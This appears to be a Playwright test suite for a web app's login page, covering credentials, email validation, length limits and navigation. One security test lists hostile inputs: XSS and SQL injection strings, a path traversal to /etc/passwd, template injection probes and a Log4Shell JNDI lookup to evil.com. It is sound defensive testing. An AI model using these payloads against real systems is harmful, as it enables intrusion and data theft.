import { test, expect } from '@playwright/test';
import { LoginPage } from '../../page-objects/auth/login.page';
import { faker } from '@faker-js/faker';

test.describe('Login Page - Chrome Only', () => {
    let loginPage: LoginPage;

    test.beforeEach(async ({ page }) => {
        console.log('🔧 Setting up login page test...');
        loginPage = new LoginPage(page);
        await loginPage.goto();
        console.log('✅ Login page loaded successfully');
    });

    test.describe('Positive Tests', () => {
        test('should successfully login with valid credentials', async () => {
            console.log('🧪 Testing: Successful login with valid credentials');
            
            const testCredentials = {
                email: 'test@breathehr.com',
                password: 'ValidPassword123!'
            };

            console.log(`📝 Step 1: Filling email field with: ${testCredentials.email}`);
            await loginPage.emailInput.fill(testCredentials.email);
            
            console.log('📝 Step 2: Filling password field');
            await loginPage.passwordInput.fill(testCredentials.password);
            
            console.log('📝 Step 3: Clicking login button');
            await loginPage.loginButton.click();
            
            console.log('📝 Step 4: Verifying successful login (checking for dashboard/home page)');
            // Add specific success verification based on the expected behavior
            await loginPage.page.waitForTimeout(2000);
            
            const currentUrl = loginPage.page.url();
            console.log(`📍 Current URL after login: ${currentUrl}`);
            
            // Check if we've navigated away from login page (successful login)
            if (!currentUrl.includes('login')) {
                console.log('✅ Login successful - navigated away from login page');
            } else {
                console.log('⚠️ Still on login page - checking for success indicators');
                // Add additional success checks here if needed
            }
        });

        test('should accept various valid email formats', async () => {
            console.log('🧪 Testing: Various valid email formats');
            
            const validEmails = [
                'test@example.com',
                'user.test@example.com',
                'user+tag@example.com',
                'user_name@example.co.uk',
                'test123@sub.domain.com'
            ];

            for (const email of validEmails) {
                console.log(`📝 Testing email format: ${email}`);
                await loginPage.goto(); // Refresh page for each test
                
                console.log(`📝 Step 1: Filling email field with: ${email}`);
                await loginPage.emailInput.fill(email);
                
                console.log('📝 Step 2: Filling password field');
                await loginPage.passwordInput.fill('TestPassword123!');
                
                // Check if login button is enabled (good sign)
                const isEnabled = await loginPage.loginButton.isEnabled();
                console.log(`📊 Login button enabled for ${email}: ${isEnabled}`);
                
                if (isEnabled) {
                    console.log(`✅ Email format accepted: ${email}`);
                } else {
                    console.log(`❌ Email format rejected: ${email}`);
                }
            }
        });
    });

    test.describe('Negative Tests - Validation', () => {
        test('should show validation errors for empty fields', async () => {
            console.log('🧪 Testing: Validation errors for empty fields');
            
            console.log('📝 Step 1: Leaving email field empty');
            await loginPage.emailInput.fill('');
            
            console.log('📝 Step 2: Leaving password field empty');
            await loginPage.passwordInput.fill('');
            
            console.log('📝 Step 3: Checking login button state');
            const isButtonDisabled = await loginPage.loginButton.isDisabled();
            
            if (isButtonDisabled) {
                console.log('✅ Login button is correctly disabled for empty fields');
                
                // Also check if email field has required attribute
                const hasRequired = await loginPage.emailInput.getAttribute('required');
                if (hasRequired !== null) {
                    console.log('✅ Email field has required attribute');
                }
                
                // Test passes - form validation is working via disabled button
                expect(isButtonDisabled).toBe(true);
                console.log('✅ Validation test completed successfully');
            } else {
                console.log('📝 Step 4: Login button is enabled, attempting to click');
                try {
                    await loginPage.loginButton.click();
                    
                    console.log('📝 Step 5: Checking for validation error messages');
                    const errorSelectors = [
                        loginPage.page.locator('.error-message'),
                        loginPage.page.locator('.alert-danger'),
                        loginPage.page.locator('[role="alert"]')
                    ];
                    
                    let errorFound = false;
                    for (const errorSelector of errorSelectors) {
                        try {
                            await expect(errorSelector).toBeVisible({ timeout: 3000 });
                            errorFound = true;
                            console.log('✅ Found error message after clicking submit');
                            break;
                        } catch {
                            continue;
                        }
                    }
                    
                    if (!errorFound) {
                        const currentUrl = loginPage.page.url();
                        if (currentUrl.includes('login')) {
                            console.log('✅ Stayed on login page - validation prevented submission');
                        } else {
                            console.log('❌ Expected validation but form was submitted');
                            throw new Error('Expected validation but form was submitted');
                        }
                    }
                } catch (error) {
                    console.log('✅ Button click prevented - validation working');
                }
            }
        });

        test('should show error for invalid email format', async () => {
            console.log('🧪 Testing: Invalid email format validation');
            
            const invalidEmails = [
                'invalid-email',
                '@example.com',
                'user@',
                'user.example.com',
                'user@@example.com',
                'user@.com',
                'user@example.',
                ' user@example.com',
                'user@example.com ',
                'user@ex ample.com',
                'user@',
                'user',
                '12345',
                'user@domain',
                'user@domain.'
            ];

            for (const invalidEmail of invalidEmails) {
                console.log(`📝 Testing invalid email: ${invalidEmail}`);
                await loginPage.goto(); // Refresh page for each test
                
                console.log(`📝 Step 1: Filling email field with invalid email: ${invalidEmail}`);
                await loginPage.emailInput.fill(invalidEmail);
                
                console.log('📝 Step 2: Filling password field with valid password');
                await loginPage.passwordInput.fill('TestPassword123!');
                
                console.log('📝 Step 3: Checking if login button is disabled for invalid email');
                const isButtonDisabled = await loginPage.loginButton.isDisabled();
                
                if (isButtonDisabled) {
                    console.log(`✅ Login button correctly disabled for invalid email: ${invalidEmail}`);
                    continue; // This is correct behavior
                }
                
                console.log('📝 Step 4: Login button is enabled, attempting to click and check validation');
                try {
                    await loginPage.loginButton.click();
                    
                    console.log('📝 Step 5: Checking for email validation errors after click');
                    const possibleEmailErrors = [
                        'Please enter a valid email address',
                        'Invalid email format',
                        'Email must be valid',
                        'Please include an \'@\' in the email address'
                    ];
                    
                    let errorFound = false;
                    for (const errorMessage of possibleEmailErrors) {
                        try {
                            await loginPage.expectValidationError(loginPage.emailInput, errorMessage);
                            errorFound = true;
                            console.log(`✅ Found email validation error for ${invalidEmail}: ${errorMessage}`);
                            break;
                        } catch {
                            continue;
                        }
                    }
                    
                    if (!errorFound) {
                        const currentUrl = loginPage.page.url();
                        if (currentUrl.includes('login')) {
                            console.log(`✅ Stayed on login page for invalid email: ${invalidEmail}`);
                        } else {
                            console.log(`⚠️ Email ${invalidEmail} may have passed client validation`);
                        }
                    }
                } catch (error) {
                    console.log(`✅ Button click prevented for invalid email: ${invalidEmail}`);
                }
            }
        });

        test('should show error for empty password field', async () => {
            console.log('🧪 Testing: Empty password field validation');
            
            const validEmail = 'test@example.com';
            
            console.log(`📝 Step 1: Filling email field with valid email: ${validEmail}`);
            await loginPage.emailInput.fill(validEmail);
            
            console.log('📝 Step 2: Leaving password field empty');
            await loginPage.passwordInput.fill('');
            
            console.log('📝 Step 3: Checking if login button is disabled for empty password');
            const isButtonDisabled = await loginPage.loginButton.isDisabled();
            
            if (isButtonDisabled) {
                console.log('✅ Login button correctly disabled for empty password');
                expect(isButtonDisabled).toBe(true);
                return;
            }
            
            console.log('📝 Step 4: Login button is enabled, attempting to click');
            try {
                await loginPage.loginButton.click();
                
                console.log('📝 Step 5: Checking for password validation errors');
                const possiblePasswordErrors = [
                    'Password is required',
                    'Please enter your password',
                    'Password field cannot be empty',
                    'Please enter a valid password'
                ];
                
                let errorFound = false;
                for (const message of possiblePasswordErrors) {
                    try {
                        await loginPage.expectValidationError(loginPage.passwordInput, message);
                        errorFound = true;
                        console.log(`✅ Found password validation error: ${message}`);
                        break;
                    } catch {
                        continue;
                    }
                }
                
                if (!errorFound) {
                    const currentUrl = loginPage.page.url();
                    if (currentUrl.includes('login')) {
                        console.log('✅ Stayed on login page - password validation working');
                    } else {
                        console.log('❌ Expected password validation but form was submitted');
                        throw new Error('Expected password validation but form was submitted');
                    }
                }
            } catch (error) {
                console.log('✅ Button click prevented - password validation working');
            }
        });

        test('should show error with invalid credentials', async () => {
            console.log('🧪 Testing: Invalid credentials authentication');
            
            const invalidCredentials = [
                { email: 'nonexistent@example.com', password: 'wrongpassword' },
                { email: 'test@example.com', password: 'WrongPassword123!' },
                { email: 'invalid@breathehr.com', password: 'InvalidPass123!' }
            ];

            for (const creds of invalidCredentials) {
                console.log(`📝 Testing invalid credentials: ${creds.email}`);
                await loginPage.goto(); // Refresh page for each test
                
                console.log(`📝 Step 1: Filling email field with: ${creds.email}`);
                await loginPage.emailInput.fill(creds.email);
                
                console.log('📝 Step 2: Filling password field');
                await loginPage.passwordInput.fill(creds.password);
                
                console.log('📝 Step 3: Clicking login button');
                await loginPage.loginButton.click();
                
                console.log('📝 Step 4: Waiting for authentication error response');
                await loginPage.page.waitForTimeout(2000);
                
                console.log('📝 Step 5: Checking for authentication error messages');
                const possibleAuthErrors = [
                    'Invalid email or password',
                    'Login failed',
                    'Invalid credentials',
                    'Username or password is incorrect',
                    'Authentication failed',
                    'The email or password you entered is incorrect'
                ];
                
                let errorFound = false;
                for (const errorMessage of possibleAuthErrors) {
                    try {
                        await loginPage.expectErrorMessage(errorMessage);
                        errorFound = true;
                        console.log(`✅ Found authentication error: ${errorMessage}`);
                        break;
                    } catch {
                        continue;
                    }
                }
                
                if (!errorFound) {
                    console.log('📝 Step 6: Trying partial error message matches');
                    try {
                        await loginPage.expectErrorMessage('incorrect');
                        console.log('✅ Found "incorrect" error message');
                    } catch {
                        try {
                            await loginPage.expectErrorMessage('invalid');
                            console.log('✅ Found "invalid" error message');
                        } catch {
                            // Check if we're still on login page (authentication failed)
                            const currentUrl = loginPage.page.url();
                            if (currentUrl.includes('login')) {
                                console.log('✅ Authentication failed - stayed on login page');
                            } else {
                                console.log('⚠️ Unexpected authentication success or page redirect');
                            }
                        }
                    }
                }
            }
        });
    });

    test.describe('Parameter-Based Tests - Field Limits', () => {
        test('should accept maximum length email addresses', async () => {
            // Test with very long but valid email (up to typical email length limits)
            const longLocalPart = 'a'.repeat(64); // Max local part length
            const longDomain = 'b'.repeat(60) + '.com'; // Long domain
            const longEmail = `${longLocalPart}@${longDomain}`;
            
            await loginPage.login(longEmail, 'TestPassword123!');
            
            // Should accept the email format (even if authentication fails)
            await loginPage.page.waitForTimeout(1000);
            
            // Verify the email was accepted by checking no client-side validation errors
            try {
                await loginPage.expectValidationError(loginPage.emailInput, 'valid');
                throw new Error('Should not have validation error for valid long email');
            } catch {
                // Good - no validation error expected
            }
        });

        test('should handle very long passwords', async () => {
            const longPassword = 'A1b2' + 'c'.repeat(250); // Very long password
            
            await loginPage.login('test@example.com', longPassword);
            
            // Should accept the password length
            await loginPage.page.waitForTimeout(1000);
        });

        test('should reject excessively long inputs', async () => {
            const excessivelyLongString = 'a'.repeat(1000);
            
            // Test extremely long email
            await loginPage.goto();
            await loginPage.login(excessivelyLongString + '@example.com', 'TestPassword123!');
            await loginPage.page.waitForTimeout(1000);
            
            // Test extremely long password
            await loginPage.goto();
            await loginPage.login('test@example.com', excessivelyLongString);
            await loginPage.page.waitForTimeout(1000);
        });
    });

    test.describe('Edge Cases and Security Tests', () => {
        test('should handle special characters in email', async () => {
            const specialCharEmails = [
                'test+tag@example.com',
                'test.email@example.com',
                'test_email@example.com',
                'test-email@example.com',
                'test123@example.com'
            ];

            for (const email of specialCharEmails) {
                await loginPage.goto();
                await loginPage.login(email, 'TestPassword123!');
                await loginPage.page.waitForTimeout(500);
            }
        });

        test('should handle special characters in password', async () => {
            const specialCharPasswords = [
                'Test123!@#$%',
                'Test123()<>[]{}',
                'Test123`~^&*',
                'Test123-_=+',
                'Test123|\\:;"\'',
                'Test123,./?'
            ];

            for (const password of specialCharPasswords) {
                await loginPage.goto();
                await loginPage.login('test@example.com', password);
                await loginPage.page.waitForTimeout(500);
            }
        });

        test('should reject malicious input attempts', async () => {
            const maliciousInputs = [
                '<script>alert("xss")</script>',
                'DROP TABLE users;',
                '../../etc/passwd',
                '${jndi:ldap://evil.com/a}',
                'javascript:alert(1)',
                '\'; DROP TABLE users; --',
                '<img src=x onerror=alert(1)>',
                '{{7*7}}',
                '${7*7}',
                'admin\' OR \'1\'=\'1'
            ];

            for (const maliciousInput of maliciousInputs) {
                await loginPage.goto();
                
                // Test malicious input in email field
                await loginPage.login(maliciousInput, 'TestPassword123!');
                await loginPage.page.waitForTimeout(500);
                
                // Ensure the application doesn't crash or execute malicious code
                await expect(loginPage.page).not.toHaveURL(/.*error.*/);
                
                await loginPage.goto();
                
                // Test malicious input in password field
                await loginPage.login('test@example.com', maliciousInput);
                await loginPage.page.waitForTimeout(500);
                
                // Ensure the application doesn't crash or execute malicious code
                await expect(loginPage.page).not.toHaveURL(/.*error.*/);
            }
        });

        test('should handle rapid multiple login attempts', async () => {
            // Test for rate limiting or proper handling of rapid requests
            const credentials = { email: 'test@example.com', password: 'wrongpassword' };
            
            for (let i = 0; i < 5; i++) {
                await loginPage.goto();
                await loginPage.login(credentials.email, credentials.password);
                await loginPage.page.waitForTimeout(500);
            }
            
            // Should handle multiple attempts gracefully (may show rate limiting message)
        });
    });

    test.describe('Navigation Tests', () => {
        test('should navigate to forgot password page', async () => {
            try {
                await loginPage.clickForgotPassword();
                
                // Check if navigated to forgot password page
                await expect(loginPage.page).toHaveURL(/.*forgot.*password.*|.*reset.*password.*/);
            } catch (error) {
                console.log('Forgot password link may not be available on this page');
            }
        });

        test('should navigate to signup page', async () => {
            try {
                await loginPage.clickSignupLink();
                
                // Check if navigated to signup page
                await expect(loginPage.page).toHaveURL(/.*sign-up.*|.*signup.*|.*register.*/);
            } catch (error) {
                console.log('Signup link may not be available on this page');
            }
        });
    });
}); 